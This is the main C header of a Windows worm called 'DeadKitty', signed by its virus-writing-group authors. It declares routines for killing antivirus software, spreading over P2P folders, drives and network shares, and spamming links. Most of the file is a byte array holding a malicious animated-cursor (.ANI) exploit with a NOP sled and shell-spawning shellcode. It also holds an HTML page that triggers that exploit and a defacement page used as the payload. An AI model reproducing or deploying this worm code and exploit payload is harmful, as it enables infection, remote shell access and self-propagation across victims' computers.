   /* This is the main include file for DeadKitty worm */

   #include <windows.h>
   #include <winsock.h>
   #include <imagehlp.h>
   #include <tlhelp32.h>
   #include <ctype.h>
   #include <mapi.h>
   #include "ZipStuff/zip.h"
   #include "ZipStuff/iowin32.h"

   /* signature */
   static char *Signature = "DeadKitty W0rm by [WarGame/doomriderz]";

   /* some useful macros & functions */
   #define WAIT(mins) Sleep(1000*60*mins)
   #define WAIT_sec(secs) Sleep(1000*secs)
   void my_strlower(char *str);
   int MyRand(void);
   #define USEWIN32IOAPI
   int MakeZip(char *ZipName,char *fileToAdd,char *NameInArchive);
   #define EVIL_WEBSERVER_PORT 800

   /* some global variables */
   char DeadKittyPath[MAX_PATH];
   char WinDir[MAX_PATH];
   char SysDir[MAX_PATH];
   char *GlobalIP; /* this will be used for links spamming */

   /* Main functions of worm */
   void AVKiller(void);
   void P2PScanner(void);
   void DriveSpread(void);
   void NetShareSpread(void);
   void ANIExploiter(void);
   void LinkSPAM(void);



   /* ---- .ANI exploit stuff ---- */

   /* the evil ANI pic */
   static unsigned char evil_ANI[] = {
       0x52,0x49,0x46,0x46,0x9c,0x18,0x00,0x00,0x41,0x43,0x4f,0x4e,0x61,0x6e,0x69,0x68,0x7c,0x03,0x00,0x00,0x24,0x00,0x00,0x00,0x08,0x00,0x00,0x00,0x08,0x00,
       0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x77,0x82,0x40,0x00,0xeb,0x64,0x90,0x90,0x77,0x82,0x40,0x00,
       0xeb,0x64,0x90,0x90,0xeb,0x54,0x90,0x90,0x77,0x82,0x40,0x00,0xeb,0x54,0x90,0x90,0x77,0x82,0x40,0x00,0xeb,0x44,0x90,0x90,0x77,0x82,0x40,0x00,0xeb,0x44,
       0x90,0x90,0x77,0x82,0x40,0x00,0xeb,0x34,0x90,0x90,0x77,0x82,0x40,0x00,0xeb,0x34,0x90,0x90,0x77,0x82,0x40,0x00,0xeb,0x24,0x90,0x90,0x77,0x82,0x40,0x00,
       0xeb,0x24,0x90,0x90,0x77,0x82,0x40,0x00,0xeb,0x14,0x90,0x90,0x77,0x82,0x40,0x00,0xeb,0x14,0x90,0x90,0x77,0x82,0x40,0x00,0x77,0x82,0x40,0x00,0x90,0x90,
       0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
       0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
       0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0xeb,0x70,0x56,0x33,0xc0,0x64,0x8b,0x40,0x30,0x85,0xc0,0x78,0x0c,0x8b,0x40,0x0c,
       0x8b,0x70,0x1c,0xad,0x8b,0x40,0x08,0xeb,0x09,0x8b,0x40,0x34,0x8d,0x40,0x7c,0x8b,0x40,0x3c,0x5e,0xc3,0x60,0x8b,0x6c,0x24,0x24,0x8b,0x45,0x3c,0x8b,0x54,
       0x05,0x78,0x03,0xd5,0x8b,0x4a,0x18,0x8b,0x5a,0x20,0x03,0xdd,0xe3,0x34,0x49,0x8b,0x34,0x8b,0x03,0xf5,0x33,0xff,0x33,0xc0,0xfc,0xac,0x84,0xc0,0x74,0x07,
       0xc1,0xcf,0x0d,0x03,0xf8,0xeb,0xf4,0x3b,0x7c,0x24,0x28,0x75,0xe1,0x8b,0x5a,0x24,0x03,0xdd,0x66,0x8b,0x0c,0x4b,0x8b,0x5a,0x1c,0x03,0xdd,0x8b,0x04,0x8b,
       0x03,0xc5,0x89,0x44,0x24,0x1c,0x61,0xc3,0xeb,0x3d,0xad,0x50,0x52,0xe8,0xa8,0xff,0xff,0xff,0x89,0x07,0x83,0xc4,0x08,0x83,0xc7,0x04,0x3b,0xf1,0x75,0xec,
       0xc3,0x8e,0x4e,0x0e,0xec,0x72,0xfe,0xb3,0x16,0x7e,0xd8,0xe2,0x73,0xad,0xd9,0x05,0xce,0xd9,0x09,0xf5,0xad,0xa4,0x1a,0x70,0xc7,0xa4,0xad,0x2e,0xe9,0xe5,
       0x49,0x86,0x49,0xcb,0xed,0xfc,0x3b,0xe7,0x79,0xc6,0x79,0x83,0xec,0x60,0x8b,0xec,0xeb,0x02,0xeb,0x05,0xe8,0xf9,0xff,0xff,0xff,0x5e,0xe8,0x3d,0xff,0xff,
       0xff,0x8b,0xd0,0x83,0xee,0x36,0x8d,0x7d,0x04,0x8b,0xce,0x83,0xc1,0x10,0xe8,0x9d,0xff,0xff,0xff,0x83,0xc1,0x18,0x33,0xc0,0x66,0xb8,0x33,0x32,0x50,0x68,
       0x77,0x73,0x32,0x5f,0x8b,0xdc,0x51,0x52,0x53,0xff,0x55,0x04,0x5a,0x59,0x8b,0xd0,0xe8,0x7d,0xff,0xff,0xff,0xb8,0x01,0x63,0x6d,0x64,0xc1,0xf8,0x08,0x50,
       0x89,0x65,0x34,0x33,0xc0,0x66,0xb8,0x90,0x01,0x2b,0xe0,0x54,0x83,0xc0,0x72,0x50,0xff,0x55,0x24,0x33,0xc0,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0xff,
       0x55,0x14,0x8b,0xf0,0x33,0xc0,0x33,0xdb,0x50,0x50,0x50,0xb8,0x02,0x01,0x23,0x28,0xfe,0xcc,0x50,0x8b,0xc4,0xb3,0x10,0x53,0x50,0x56,0xff,0x55,0x18,0x53,
       0x56,0xff,0x55,0x1c,0x53,0x8b,0xd4,0x2b,0xe3,0x8b,0xcc,0x52,0x51,0x56,0xff,0x55,0x20,0x8b,0xf0,0x33,0xc9,0xb1,0x54,0x2b,0xe1,0x8b,0xfc,0x57,0x33,0xc0,
       0xf3,0xaa,0x5f,0xc6,0x07,0x44,0xfe,0x47,0x2d,0x57,0x8b,0xc6,0x8d,0x7f,0x38,0xab,0xab,0xab,0x5f,0x33,0xc0,0x8d,0x77,0x44,0x56,0x57,0x50,0x50,0x50,0x40,
       0x50,0x48,0x50,0x50,0xff,0x75,0x34,0x50,0xff,0x55,0x08,0xf7,0xd0,0x50,0xff,0x36,0xff,0x55,0x10,0xff,0x77,0x38,0xff,0x55,0x28,0xff,0x55,0x0c,0x90,0x90,
       0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
       0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
       0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
       0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
       0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
       0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
       0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
       0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
       0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
       0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90
   };

   #define ANI_PIC_SIZE 912


   /* the html code to send */
   static char evil_HTML[] =
   "<html>\n"
   "<head>\n\t<style>\n"
   "\t\t* {CURSOR: url(\"DeadKitty.ani\")}\n\t</style>\n</head>\n"
   "</html>";


   #define HTML_SIZE strlen(evil_HTML)

   /* ---------------------------- */

   /* payload stuff */
   static char payload_HTML[] =
   "<html>\r\n"
   "<head>\r\n"
   "<title>Infected by DeadKitty w0rm by [WarGame/doomriderz]</title>\r\n"
   "</head>\r\n"
   "<body bgcolor=\"YELLOW\">\r\n"
   "<center><img src=\"http://xs414.xs.to/xs414/07163/Emo6.JPG\"></img></center></br>\r\n"
   "<center><P>Greetz to: free0n, Necronomikon, genetix, Mike_Hood, _Machiavel, MrAnderson</P></center>\r\n"
   "</body>\r\n"
   "</html>";
   /*****************/
